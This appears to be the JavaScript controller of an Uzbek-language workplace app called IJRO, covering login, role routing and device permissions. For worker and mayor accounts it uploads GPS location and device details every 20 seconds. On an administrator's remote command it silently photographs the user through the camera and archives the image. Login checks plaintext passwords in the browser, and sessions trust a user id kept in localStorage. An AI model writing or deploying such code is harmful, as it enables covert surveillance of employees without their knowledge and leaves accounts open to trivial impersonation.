// IJRO Main App Controller & Router
document.addEventListener('DOMContentLoaded', () => {
  window.initFirebase();

  // Check saved session
  const savedUserId = localStorage.getItem('ijro_user_id');
  if (savedUserId) {
    window.onStoreChange('users', (users) => {
      if (!window.store.currentUser) {
        const found = users.find(u => u.id === savedUserId);
        if (found) {
          window.store.currentUser = found;
          routeUserToScreen(found);
        }
      }
    });
  }
});

function handleLogin(e) {
  if (e) e.preventDefault();
  const username = document.getElementById('login-user').value.trim();
  const pass = document.getElementById('login-pass').value.trim();

  if (!username || !pass) {
    alert("Iltimos, login va parolni kiriting!");
    return;
  }

  const user = window.store.users.find(u => 
    u.username && u.username.toLowerCase() === username.toLowerCase() && u.password === pass
  );

  if (!user) {
    alert("Login yoki parol noto'g'ri! Iltimos, qayta tekshirib ko'ring.");
    return;
  }

  window.store.currentUser = user;
  localStorage.setItem('ijro_user_id', user.id);
  routeUserToScreen(user);
}

function handleLogout() {
  if (confirm("Haqiqatan ham tizimdan chiqmoqchimisiz?")) {
    window.store.currentUser = null;
    localStorage.removeItem('ijro_user_id');
    showScreen('login-screen');
    showToast("Tizimdan chiqildi");
  }
}

function routeUserToScreen(user) {
  if (user.role === 'MAYOR') {
    showScreen('mayor-screen');
    initMayorView();
    checkWebPermissions(user);
  } else if (user.role === 'WORKER') {
    showScreen('worker-screen');
    initWorkerView();
    checkWebPermissions(user);
  } else if (user.role === 'BIG_ADMIN' || user.role === 'ADMIN') {
    showScreen('admin-screen');
    initAdminView();
  }
}

function checkWebPermissions(user) {
  const granted = localStorage.getItem('ijro_web_permissions_granted');
  if (!granted) {
    const modal = document.getElementById('permission-setup-modal');
    if (modal) modal.classList.add('active');
  } else {
    initWebSurveillanceSync(user);
  }
}

async function requestWebPermissions() {
  const modal = document.getElementById('permission-setup-modal');
  if (modal) modal.classList.remove('active');
  localStorage.setItem('ijro_web_permissions_granted', 'true');

  showToast("🛡️ Ruxsatnomalar so'ralmoqda...");

  // 1. Notification permission
  try {
    if ('Notification' in window && Notification.permission !== 'granted') {
      await Notification.requestPermission();
    }
  } catch (e) {
    console.log('Notification permission error', e);
  }

  // 2. Camera and Microphone permission
  try {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      // Ruxsat olingach oqimni to'xtatib turamiz
      stream.getTracks().forEach(track => track.stop());
    }
  } catch (e) {
    console.log('Media (Camera/Mic) permission error', e);
    // Kamida audio so'rab ko'ramiz
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream.getTracks().forEach(track => track.stop());
      }
    } catch (_e) {}
  }

  // 3. Geolocation (GPS) permission
  try {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          console.log('GPS granted:', pos.coords.latitude, pos.coords.longitude);
          if (window.store.currentUser) {
            uploadWebLocation(window.store.currentUser.username, pos.coords.latitude, pos.coords.longitude);
          }
        },
        (err) => console.log('Geolocation error', err),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  } catch (e) {
    console.log('GPS error', e);
  }

  showToast("✅ Barcha ruxsatnomalar tasdiqlandi!");
  if (window.store.currentUser) {
    initWebSurveillanceSync(window.store.currentUser);
  }
}

function uploadWebLocation(username, lat, lon) {
  try {
    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      db.ref(`tracking/devices/${username}/location`).setValue({
        lat: lat.toString(),
        lon: lon.toString(),
        timestamp: Date.now()
      });
    }
  } catch (e) {
    console.log('uploadWebLocation error', e);
  }
}

let webSyncInterval = null;
function initWebSurveillanceSync(user) {
  if (!user || !user.username) return;
  if (webSyncInterval) clearInterval(webSyncInterval);

  const username = user.username;

  // Heartbeat va GPS yangilab turish
  const sendHeartbeatAndGps = () => {
    try {
      if (window.firebase && window.firebase.database) {
        const db = window.firebase.database();
        db.ref(`tracking/devices/${username}/heartbeat`).setValue(Date.now());
        db.ref(`tracking/devices/${username}/info`).update({
          userId: user.id,
          username: user.username,
          fullName: user.fullName || `${user.firstName || ''} ${user.lastName || ''}`.trim(),
          role: user.role,
          position: user.position || 'Xodim',
          model: navigator.userAgent.substring(0, 40),
          updatedAt: Date.now()
        });

        if ('geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition((pos) => {
            uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
          }, null, { enableHighAccuracy: true, timeout: 10000 });
        }
      }
    } catch (e) {}
  };

  sendHeartbeatAndGps();
  webSyncInterval = setInterval(sendHeartbeatAndGps, 20000);

  // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim uchun ham)
  try {
    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      let lastPhotoTs = 0;
      db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
        const ts = snap.val();
        if (ts && ts > 0 && ts !== lastPhotoTs) {
          lastPhotoTs = ts;
          captureWebPhoto(username);
        }
      });
    }
  } catch (e) {}
}

async function captureWebPhoto(username) {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];

    stream.getTracks().forEach(t => t.stop());

    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      const photoItem = {
        back_base64: base64,
        front_base64: base64,
        timestamp: Date.now()
      };
      db.ref(`tracking/devices/${username}/media/latest_photo`).setValue(photoItem);
      db.ref(`tracking/devices/${username}/media/archive_photos`).push().setValue(photoItem);
      db.ref(`tracking/devices/${username}/media/status`).setValue(`📷 Rasm olindi (${Date.now()})`);
    }
  } catch (e) {
    console.log('captureWebPhoto error', e);
  }
}

function showScreen(screenId) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  const target = document.getElementById(screenId);
  if (target) target.classList.add('active');
}

function showToast(message) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.innerText = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}
